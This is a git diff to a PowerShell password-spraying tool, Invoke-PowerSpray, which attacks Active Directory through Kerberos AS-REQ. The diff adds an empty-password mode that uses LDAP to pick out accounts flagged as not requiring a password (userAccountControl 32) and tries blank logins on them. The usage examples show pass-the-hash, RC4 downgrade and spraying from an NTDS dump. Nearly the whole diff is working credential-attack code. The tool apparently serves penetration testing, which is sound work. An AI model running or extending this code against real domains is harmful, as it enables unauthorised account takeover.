@@ -18,6 +18,9 @@ Function Invoke-PowerSpray {
 .PARAMETER UserFile
     Specifies a file containing a list of usernames to send the AS-REQ for.
 
+.PARAMETER EmptyPassword
+    Specifies empty password for each authentication attempt. When `-Ldap` switch is enabled, user list is filtered based on the UF_DONT_EXPIRE_PASSWD flag.
+
 .PARAMETER UserAsPassword
     Specifies username as password for each authentication attempt (default case, lowercase or uppercase).
 
@@ -74,13 +77,16 @@ Function Invoke-PowerSpray {
     PS C:\> Invoke-PowerSpray -Server 192.168.1.10 -UserFile .\users.lst
 
 .EXAMPLE
-    PS C:\> Invoke-PowerSpray -Ldap -BloodHound
+    PS C:\> Invoke-PowerSpray -Ldap -EncType RC4
+
+.EXAMPLE
+    PS C:\> Invoke-PowerSpray -Server DC.ADATUM.CORP -Ldap -UserAsPassword -BloodHound -Neo4jCredential neo4j
+
+.EXAMPLE
+    PS C:\> Invoke-PowerSpray -Server DC.ADATUM.CORP -Ldap -LdapCredential testuser@ADATUM.CORP -Password 'Welcome2020'
 
 .EXAMPLE
     PS C:\> Invoke-PowerSpray -Server DC.ADATUM.CORP -UserName testuser -Hash F6F38B793DB6A94BA04A52F1D3EE92F0
-
-.EXAMPLE
-    PS C:\> Invoke-PowerSpray -Server DC.ADATUM.CORP -Ldap -LdapCredential testuser@ADATUM.CORP -Password 'Welcome2020' -EncType RC4
 
 .EXAMPLE
     PS C:\> Invoke-PowerSpray -Server ADATUM.CORP -DumpFile .\CONTOSO.ntds -Threads 5
@@ -95,6 +101,9 @@ Function Invoke-PowerSpray {
         [ValidateScript({Test-Path $_ -PathType Leaf})]
         [String]
         $UserFile,
+
+        [Switch]
+        $EmptyPassword,
 
         [ValidateSet('default', 'lowercase', 'uppercase')]
         [String]
@@ -183,7 +192,7 @@ Function Invoke-PowerSpray {
         $Ldap = $true
     }
     if ($Ldap) {
-        if ($CheckOldPwd -and ($PSBoundParameters.ContainsKey('Password') -or $PSBoundParameters.ContainsKey('Hash') -or $PSBoundParameters.ContainsKey('UserAsPassword'))) {
+        if ($CheckOldPwd -and ($PSBoundParameters.ContainsKey('Password') -or $PSBoundParameters.ContainsKey('Hash') -or $PSBoundParameters.ContainsKey('UserAsPassword') -or $PSBoundParameters.ContainsKey('EmptyPassword'))) {
             # Check if the Server has PDC role
             $pdcServers = (Resolve-DnsName -Server $domain -Name "_ldap._tcp.pdc._msdcs.$domain" -Type SRV -Verbose:$false).IPAddress
             if (-not ($pdcServers -contains $Server)) {
@@ -191,7 +200,7 @@ Function Invoke-PowerSpray {
             }
         }
 
-        if (-not $LockoutThreshold -and ($PSBoundParameters.ContainsKey('Password') -or $PSBoundParameters.ContainsKey('Hash') -or $PSBoundParameters.ContainsKey('UserAsPassword'))) {
+        if (-not $LockoutThreshold -and ($PSBoundParameters.ContainsKey('Password') -or $PSBoundParameters.ContainsKey('Hash') -or $PSBoundParameters.ContainsKey('UserAsPassword') -or $PSBoundParameters.ContainsKey('EmptyPassword'))) {
             # Get lockout threshold defined in Default Password Policy
             $LockoutThreshold = (Get-LdapObject -ADSpath $adsPath -Credential $LdapCredential -Filter '(objectClass=domain)' -Properties 'lockoutThreshold' -SearchScope 'Base').lockoutThreshold
             Write-Warning "LockoutThreshold value defined in Default Password Policy is $LockoutThreshold"
@@ -203,6 +212,9 @@ Function Invoke-PowerSpray {
     $pass = $null
     if ($PSBoundParameters.ContainsKey('Password')) {
         $pass = $Password
+    }
+    if ($PSBoundParameters.ContainsKey('EmptyPassword')) {
+        $pass = ''
     }
 
     $nthash = $null
@@ -223,6 +235,9 @@ Function Invoke-PowerSpray {
     if ($Username) {
         if ($Ldap) {
             $filter = "(samAccountName=$Username)"
+            if ($PSBoundParameters.ContainsKey('EmptyPassword')) {
+                $filter = "(&(userAccountControl:1.2.840.113556.1.4.803:=32)$filter)"
+            }
             if ($user = Get-LdapObject -ADSpath $adsPath -Filter $filter -Properties $properties -Credential $LdapCredential) {
                 $badPwdCount = $user.badPwdCount
             }
@@ -231,7 +246,6 @@ Function Invoke-PowerSpray {
             }
         }
         if ($PSBoundParameters.ContainsKey('UserAsPassword')) {
-            $nthash = $null
             switch ($UserAsPassword) {
                 lowercase {
                     $pass = $Username.ToLower()
@@ -252,6 +266,9 @@ Function Invoke-PowerSpray {
         foreach ($username in Get-Content $UserFilePath) {
             if ($Ldap) {
                 $filter = "(samAccountName=$username)"
+                if ($PSBoundParameters.ContainsKey('EmptyPassword')) {
+                    $filter = "(&(userAccountControl:1.2.840.113556.1.4.803:=32)$filter)"
+                }
                 if ($user = Get-LdapObject -ADSpath $adsPath -Filter $filter -Properties $properties -Credential $LdapCredential) {
                     $badPwdCount = $user.badPwdCount
                 }
@@ -261,7 +278,6 @@ Function Invoke-PowerSpray {
             }
             if ($user -or -not $Ldap) {
                 if ($PSBoundParameters.ContainsKey('UserAsPassword')) {
-                    $nthash = $null
                     switch ($UserAsPassword) {
                         lowercase {
                             $pass = $username.ToLower()
@@ -290,6 +306,9 @@ Function Invoke-PowerSpray {
                 }
                 if ($Ldap) {
                     $filter = "(samAccountName=$username)"
+                    if ($PSBoundParameters.ContainsKey('EmptyPassword')) {
+                        $filter = "(&(userAccountControl:1.2.840.113556.1.4.803:=32)$filter)"
+                    }
                     if ($user = Get-LdapObject -ADSpath $adsPath -Filter $filter -Properties $properties -Credential $LdapCredential) {
                         $badPwdCount = $user.badPwdCount
                     }
@@ -325,7 +344,7 @@ Function Invoke-PowerSpray {
         foreach($userAccountControl in $disabledUserAccountControl) {
             $filter += "(!userAccountControl:1.2.840.113556.1.4.803:=$userAccountControl)"
         }
-        if (-not ($PSBoundParameters.ContainsKey('Password') -or $PSBoundParameters.ContainsKey('Hash') -or $PSBoundParameters.ContainsKey('UserAsPassword'))) {
+        if (-not ($PSBoundParameters.ContainsKey('Password') -or $PSBoundParameters.ContainsKey('Hash') -or $PSBoundParameters.ContainsKey('UserAsPassword') -or $PSBoundParameters.ContainsKey('EmptyPassword'))) {
             # Find all enabled users without kerberos preauthentication enabled (AS-REP roasting)
             $filter = "(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304)$filter)"
             $users = Get-LdapObject -ADSpath $adsPath -Filter $filter -Properties $properties -Credential $LdapCredential
@@ -335,12 +354,14 @@ Function Invoke-PowerSpray {
             if ($LockoutThreshold -gt 0) {
                 $filter = "(&(!(badPwdCount>=$LockoutThreshold))$filter)"
             }
+            if ($PSBoundParameters.ContainsKey('EmptyPassword')) {
+                $filter = "(&(userAccountControl:1.2.840.113556.1.4.803:=32)$filter)"
+            }
             $filter = "(&(samAccountType=805306368)$filter)"
             $users = Get-LdapObject -ADSpath $adsPath -Filter $filter -Properties $properties -Credential $LdapCredential
         }
         foreach ($user in $users) {
             if ($PSBoundParameters.ContainsKey('UserAsPassword')) {
-                $nthash = $null
                 switch ($UserAsPassword) {
                     lowercase {
                         $pass = $user.samAccountName.ToLower()
